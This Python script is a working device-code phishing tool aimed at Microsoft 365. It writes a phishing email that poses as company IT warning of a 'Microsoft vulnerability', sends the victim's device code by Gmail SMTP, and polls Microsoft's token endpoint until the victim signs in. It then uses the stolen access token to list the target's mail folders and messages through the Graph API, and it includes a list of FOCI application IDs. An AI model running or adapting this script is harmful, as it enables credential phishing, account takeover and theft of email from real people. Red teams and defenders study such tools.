#!/usr/bin/python3
from colorama import Fore, Back, Style
import requests, time, json

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formataddr
#############################################3##


## Email Integration to send the Phishing email
#
# In order for this script to send an email it needs a mail
# server. This script is configured to use a gmail email 
# address but your gmail needs an app password which you would put in here.

# Set this to 1 to send a phish email, you have to fill in the next 3 fields for a phish
# email to be sent successfully
send_phish_email=0

msgRecip=""

gmail_user = ''
gmail_app_password=""

# This will be the email address seen in the From: field in the email
msgSender_Name = "Security guy"
msgSender="security@abcone.com"

msg_Subject="New Microsoft Vulnerability, please apply update ASAP."

msg_Body="Hey Mr Employee,\n\
          \n\
          We are in the process of updating our Microsoft Office services.\n\
          Will you please visit the below URL and use your unique code to register for the upgrade?\n\
          \n\
                URL: https://microsoft.com/devicelogin\n\
                Your unique code: __CODE__\n\
          \n\
          Thanks!\n\
          Yours sincerely,\n\
          Your company IT"

###############################################


ua_string = "Mozilla/5.0 (Macintosh; Intel Mac OS X 12.2; rv:68.0) Gecko/20100101 Firefox/68.0"
device_code_url = "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0"
token_retrieve_url = "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0"
client_id =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
resource = "https://graph.microsoft.com"

device_code_payload = {
    "client_id": client_id,
    "resource": resource
}




def sendMsg(body):
   msg = MIMEMultipart()
   msg['From'] = formataddr((msgSender_Name, msgSender))
   msg['To'] = msgRecip
   msg['Subject'] = msg_Subject

   msg.attach(MIMEText(body, 'html'))
   with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
       smtp.login(gmail_user, gmail_app_password)    #login gmail account
       smtp.sendmail(msgSender, msgRecip,msg.as_string())



foci_app_ids = [
    {
        "appName": "Office 365 Management",
        "appId": "00b41c95-dab0-4487-9791-b9d2c32c80f2",
    },
    {
        "appName": "Microsoft Azure CLI",
        "appId": "04b07795-8ddb-461a-bbee-02f9e1bf7b46",
    },
    {
        "appName": "Microsoft Azure PowerShell",
        "appId": "1950a258-227b-4e31-a9cf-717495945fc2",
    }, 
    {
        "appName": "Microsoft Teams",
        "appId": "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
    },
    {
        "appName": "Windows Search",
        "appId": "26a7ee05-5602-4d76-a7ba-eae8b7b67941",
    },
    {
        "appName": "Outlook Mobile",
        "appId": "27922004-5251-4030-b22d-91ecd9a37ea4",
    },
    {
        "appName": "Microsoft Authenticator App",
        "appId": "4813382a-8fa7-425e-ab75-3b753aab3abb",
    },
    {
        "appName": "OneDrive SyncEngine",
        "appId": "ab9b8c07-8f02-4f72-87fa-80105867a763",
    }, 
    {
        "appName": "Microsoft Office",
        "appId": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    },  
    {
        "appName": "Visual Studio",
        "appId": "872cd9fa-d31f-45e0-9eab-6e460a02d1f1",
    }, 
    {
        "appName": "OneDrive iOS App",
        "appId": "af124e86-4e96-495a-b70a-90f90ab96707",
    },
    {
        "appName": "Microsoft Bing Search for Microsoft Edge",
        "appId": "2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8",
    },
    {
        "appName": "Microsoft Stream Mobile Native",
        "appId": "844cca35-0656-46ce-b636-13f48b0eecbd",
    }, 
    {
        "appName": "Microsoft Teams - Device Admin Agent",
        "appId": "87749df4-7ccf-48f8-aa87-704bad0e0e16",
    },
    {
        "appName": "Microsoft Bing Search",
        "appId": "cf36b471-5b44-428c-9ce7-313bf84528de",
    },
    {
        "appName": "Office UWP PWA",
        "appId": "0ec893e0-5785-4de6-99da-4ed124e5296c",
    },  
    {
        "appName": "Microsoft To-Do client",
        "appId": "22098786-6e16-43cc-a27d-191a01a1e3b5",
    }, 
    {
        "appName": "PowerApps",
        "appId": "4e291c71-d680-4d0e-9640-0a3358e31177",
    },
    {
        "appName": "Microsoft Whiteboard Client",
        "appId": "57336123-6e14-4acc-8dcf-287b6088aa28",
    },   
    {
        "appName": "Microsoft Flow",
        "appId": "57fcbcfa-7cee-4eb1-8b25-12d2030b4ee0",
    },    
    {
        "appName": "Microsoft Planner",
        "appId": "66375f6b-983f-4c2c-9701-d680650f588f",
    },   
    {
        "appName": "Microsoft Intune Company Portal",
        "appId": "69ba1a5c7-f17a-4de9-a1f1-6178c8d51223",
    },     
    {
        "appName": "Accounts Control UI",
        "appId": "a40d7d7d-59aa-447e-a655-679a4107e548",
    }, 
    {
        "appName": "Yammer iPhone",
        "appId": "a569458c-7f2b-45cb-bab9-b7dee514d112",
    },    
    {
        "appName": "OneDrive",
        "appId": "b26aadf8-566f-4478-926f-589f601d9c74",
    },    
    {
        "appName": "Microsoft Power BI",
        "appId": "c0d2a505-13b8-4ae0-aa9e-cddd5eab0b12",
    },  
    {
        "appName": "SharePoint",
        "appId": "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0",
    },
    {
        "appName": "Microsoft Edge",
        "appId": "e9c51622-460d-4d3d-952d-966a5b1da34c",
    },    
    {
        "appName": "Microsoft Tunnel",
        "appId": "eb539595-3fe1-474e-9c1d-feb3625d1be5",
    },   
    {
        "appName": "Microsoft Edge",
        "appId": "ecd6b820-32c2-49b6-98a6-444530e5a77a",
    },    
    {
        "appName": "SharePoint Android",
        "appId": "f05ff7c9-f75a-4acd-a3b5-f4b6a870245d",
    },       
    {
        "appName": "Microsoft Edge",
        "appId": "f44b1140-bc5e-48c6-8dc0-5cf5a53c0e34",
    },     

]


def device_code_flow_auto_polling():
    r = requests.post(device_code_url, data=device_code_payload)
    print("Here's the phish content to authorize this script,\n\
                URL: https://microsoft.com/devicelogin\n\
                Your unique code: "+r.json()['user_code']+"\n")
    print("Example:")
    print(msg_Body.replace("__CODE__", r.json()['user_code']))

    if (send_phish_email != 0):
       sendMsg("<html><pre>"+msg_Body.replace("__CODE__", r.json()['user_code'])+"</pre></html>")
       print("Phish email sent")

    headers = {
        'User-Agent': ua_string
    }
    data = {
        "client_id": client_id,
        "resource": resource,
        "code": r.json()["device_code"],
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
    }
    print("Polling for succesfull auth every 4 seconds for 15 minutes...")
    start_time = time.time()
    while time.time() - start_time < 900:  # 15 minutes = 900 seconds
        tr = requests.post(token_retrieve_url, data=data, headers=headers)
        if "error" in tr.json():
            time.sleep(4)
        else:
            print("Success!")
            return tr.json()


def download_target_email(token):
    # download first 10 emails of each mail folder for the target user
    headers = {
        "Authorization" : "Bearer "+token["access_token"],
        "User-Agent": ua_string
    }
    for f in requests.get("https://graph.microsoft.com/v1.0/me/mailFolders/", headers=headers).json()["value"]:
        print(Fore.GREEN + f"Downloading {f['displayName']}")
        for m in requests.get(f"https://graph.microsoft.com/v1.0/me/mailFolders/{f['id']}/messages", headers=headers).json()["value"]:
            print(Fore.YELLOW + f" >>> {m['subject']}")



if __name__ == '__main__':
    print("Generating O365 Device Code request from API")
    # device code flow with auto polling
    token = device_code_flow_auto_polling()
    print(json.dumps(token))
    # download 10 emails from target user account
    download_target_email(token)
    print("  >>> Deploy Sharepoint Application")
